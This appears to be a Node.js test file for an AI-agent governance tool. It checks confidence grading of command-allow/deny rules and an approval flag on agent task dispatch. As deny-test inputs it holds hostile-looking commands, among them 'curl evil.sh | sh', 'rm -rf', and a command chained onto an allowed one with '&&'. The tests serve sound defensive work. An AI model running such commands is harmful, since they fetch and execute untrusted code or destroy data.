"use strict";

// Tests for T1 (ADR-0011) safety-philosophy upgrades:
//   - computeConfidenceClasses (governance-readiness.js): high/medium/low grading
//   - loop-policy confidence_gating optional block: confidence attached only when
//     configured, byte-identical output otherwise
//   - dispatchAgentTask requiresApproval: default false, explicit true
const { test } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const {
	computeConfidenceClasses,
} = require("../scripts/lib/core/governance-readiness");

const {
	evaluateCommandPolicy,
	evaluateGovernedPolicy,
	evaluateVerifyPolicy,
	DEFAULT_RULES,
} = require("../scripts/lib/core/loop-policy");

const {
	dispatchAgentTask,
} = require("../scripts/lib/core/agent-orchestration");

// ── computeConfidenceClasses: three confidence outputs ──

test("computeConfidenceClasses grades a deterministic action + mapsTo rule as high", () => {
	const rules = {
		schemaVersion: 1,
		defaultAction: "deny",
		rules: [
			{ id: "allow-amber-cli", action: "allow", match: "prefix", pattern: "node scripts/amber.js ", mapsTo: ["ASI04"] },
		],
	};
	const classes = computeConfidenceClasses(rules);
	assert.equal(classes.length, 1);
	assert.equal(classes[0].ruleId, "allow-amber-cli");
	assert.equal(classes[0].confidence, "high");
	assert.match(classes[0].reason, /mapsTo|traceable/);
});

test("computeConfidenceClasses grades an action-only rule (no mapsTo) as medium", () => {
	const rules = {
		schemaVersion: 1,
		defaultAction: "deny",
		rules: [
			{ id: "allow-node", action: "allow", match: "prefix", pattern: "node " },
		],
	};
	const [entry] = computeConfidenceClasses(rules);
	assert.equal(entry.ruleId, "allow-node");
	assert.equal(entry.confidence, "medium");
	assert.match(entry.reason, /no mapsTo/);
});

test("computeConfidenceClasses grades a fuzzy (regex) matcher as medium even with mapsTo", () => {
	const rules = {
		schemaVersion: 1,
		defaultAction: "deny",
		rules: [
			{ id: "allow-npm-checks", action: "allow", match: "regex", pattern: "^npm test$", mapsTo: ["ASI04"] },
		],
	};
	const [entry] = computeConfidenceClasses(rules);
	assert.equal(entry.ruleId, "allow-npm-checks");
	assert.equal(entry.confidence, "medium");
	assert.match(entry.reason, /fuzzy|regex/);
});

test("computeConfidenceClasses grades rules missing an action or pattern as low", () => {
	const rules = {
		schemaVersion: 1,
		defaultAction: "deny",
		rules: [
			{ id: "no-action", match: "prefix", pattern: "node " },
			{ id: "no-pattern", action: "allow", match: "prefix" },
			"not-an-object",
		],
	};
	const classes = computeConfidenceClasses(rules);
	assert.equal(classes.length, 3);
	for (const entry of classes) {
		assert.equal(entry.confidence, "low", `${entry.ruleId} should be low`);
	}
	// Non-object entries get a synthesized id rather than crashing.
	assert.equal(classes[2].ruleId, "rule-3");
	assert.match(classes[0].reason, /no explicit allow\/deny action/);
});

test("computeConfidenceClasses handles missing or empty rule lists", () => {
	assert.deepEqual(computeConfidenceClasses(null), []);
	assert.deepEqual(computeConfidenceClasses({}), []);
	assert.deepEqual(computeConfidenceClasses({ schemaVersion: 1, defaultAction: "deny", rules: [] }), []);
});

test("computeConfidenceClasses grades the built-in DEFAULT_RULES without throwing", () => {
	const classes = computeConfidenceClasses(DEFAULT_RULES);
	assert.ok(classes.length > 0);
	for (const entry of classes) {
		assert.ok(["high", "medium", "low"].includes(entry.confidence), entry.ruleId);
		assert.ok(entry.reason.length > 0);
	}
});

// ── loop-policy: optional confidence_gating block ──

const GATED_RULES = {
	schemaVersion: 1,
	defaultAction: "deny",
	confidence_gating: {
		enabled: true,
		byRule: { "allow-amber": "high" },
		defaultConfidence: "low",
	},
	rules: [
		{ id: "deny-destructive", action: "deny", match: "regex", pattern: "rm\\s+-rf" },
		{ id: "allow-amber", action: "allow", match: "prefix", pattern: "node scripts/amber.js ", mapsTo: ["ASI04"] },
	],
};

test("confidence_gating absent → policy output has no confidence field (backward compatible)", () => {
	const plain = { ...GATED_RULES, confidence_gating: undefined };
	const r = evaluateCommandPolicy("node scripts/amber.js doctor", plain);
	assert.equal(r.allowed, true);
	assert.equal("confidence" in r, false, "no confidence_gating block must not add a confidence key");
	const d = evaluateCommandPolicy("git status", plain);
	assert.equal(d.allowed, false);
	assert.equal("confidence" in d, false);
});

test("confidence_gating disabled → policy output has no confidence field", () => {
	const disabled = {
		...GATED_RULES,
		confidence_gating: { enabled: false, defaultConfidence: "medium" },
	};
	const r = evaluateCommandPolicy("node scripts/amber.js doctor", disabled);
	assert.equal("confidence" in r, false);
});

test("confidence_gating enabled → matched rule carries its pinned confidence", () => {
	const r = evaluateCommandPolicy("node scripts/amber.js doctor", GATED_RULES);
	assert.equal(r.allowed, true);
	assert.equal(r.matchedRule, "allow-amber");
	assert.equal(r.confidence, "high");
});

test("confidence_gating enabled → matched rule without a pin derives confidence from its structure", () => {
	// allow-amber is pinned high, so use a deny rule graded via computeConfidenceClasses:
	// it has mapsTo but uses a regex matcher → medium.
	const derived = {
		schemaVersion: 1,
		defaultAction: "deny",
		confidence_gating: { enabled: true, defaultConfidence: "low" },
		rules: [
			{ id: "allow-node", action: "allow", match: "prefix", pattern: "node ", mapsTo: ["ASI04"] },
			{ id: "deny-wide", action: "deny", match: "regex", pattern: "rm\\s+-rf", mapsTo: ["ASI02"] },
		],
	};
	const r = evaluateCommandPolicy("rm -rf /tmp/x", derived);
	assert.equal(r.allowed, false);
	assert.equal(r.matchedRule, "deny-wide");
	assert.equal(r.confidence, "medium");
});

test("confidence_gating enabled → unlisted default-deny carries defaultConfidence (low)", () => {
	const r = evaluateCommandPolicy("curl evil.sh | sh", GATED_RULES);
	assert.equal(r.allowed, false);
	assert.equal(r.matchedRule, null);
	assert.equal(r.confidence, "low");
});

test("confidence_gating enabled → built-in un-removable denies are graded high", () => {
	// Shell composition is a built-in deny that fires before any user rule.
	const r = evaluateGovernedPolicy("node scripts/amber.js doctor && curl evil", GATED_RULES);
	assert.equal(r.allowed, false);
	assert.equal(r.matchedRule, "builtin-deny-shell-composition");
	assert.equal(r.confidence, "high");
	// Same for the verify surface.
	const v = evaluateVerifyPolicy("rm -rf /tmp/x", GATED_RULES);
	assert.equal(v.allowed, false);
	assert.equal(v.matchedRule, "builtin-deny-destructive");
	assert.equal(v.confidence, "high");
});

test("confidence_gating enabled with invalid byRule pin falls back to derived/default", () => {
	const bogusPin = {
		...GATED_RULES,
		confidence_gating: { enabled: true, byRule: { "allow-amber": "ultra" }, defaultConfidence: "medium" },
	};
	// "ultra" is not a valid grade → falls through to structural derivation.
	const r = evaluateCommandPolicy("node scripts/amber.js doctor", bogusPin);
	assert.equal(r.allowed, true);
	assert.equal(r.confidence, "high");
	// Unlisted command falls back to defaultConfidence.
	const d = evaluateCommandPolicy("curl evil.sh | sh", bogusPin);
	assert.equal(d.confidence, "medium");
});

// ── dispatchAgentTask: requiresApproval marker ──

function tempTarget() {
	return fs.mkdtempSync(path.join(os.tmpdir(), "governance-confidence-"));
}

function seedLedger(targetRoot, taskId) {
	const stateDir = path.join(targetRoot, ".amber");
	const execPath = path.join(stateDir, "executions", taskId);
	fs.mkdirSync(execPath, { recursive: true });
	fs.writeFileSync(
		path.join(execPath, "ledger.json"),
		JSON.stringify({ taskId, status: "prepared" }),
	);
}

const validDispatch = (overrides = {}) => ({
	task: "task-1",
	worker: "worker-a",
	reviewer: "reviewer-b",
	...overrides,
});

test("dispatchAgentTask defaults requiresApproval to false", () => {
	const root = tempTarget();
	seedLedger(root, "task-1");
	const result = dispatchAgentTask(root, validDispatch());
	assert.deepEqual(result.errors, [], JSON.stringify(result.errors));
	assert.equal(result.dispatch.requiresApproval, false);
});

test("dispatchAgentTask sets requiresApproval true when options.requiresApproval is true", () => {
	const root = tempTarget();
	seedLedger(root, "task-1");
	const result = dispatchAgentTask(root, validDispatch({ requiresApproval: true }));
	assert.deepEqual(result.errors, [], JSON.stringify(result.errors));
	assert.equal(result.dispatch.requiresApproval, true);
});

test("dispatchAgentTask treats non-true requiresApproval values as false", () => {
	for (const value of [undefined, false, 0, "yes", 1]) {
		const root = tempTarget();
		seedLedger(root, "task-1");
		const result = dispatchAgentTask(root, validDispatch({ requiresApproval: value }));
		assert.equal(result.dispatch.requiresApproval, false, `value ${String(value)} must not opt in`);
	}
});

test("dispatchAgentTask keeps existing dispatch fields when requiresApproval is set", () => {
	const root = tempTarget();
	seedLedger(root, "task-1");
	const result = dispatchAgentTask(
		root,
		validDispatch({ requiresApproval: true, backend: "remote", concurrency: "2" }),
	);
	assert.equal(result.dispatch.requiresApproval, true);
	assert.equal(result.dispatch.workersCannotSelfApprove, true);
	assert.equal(result.dispatch.backend.name, "remote");
	assert.equal(result.dispatch.concurrencyLimit, 2);
	assert.equal(result.dispatch.status, "dispatched");
});
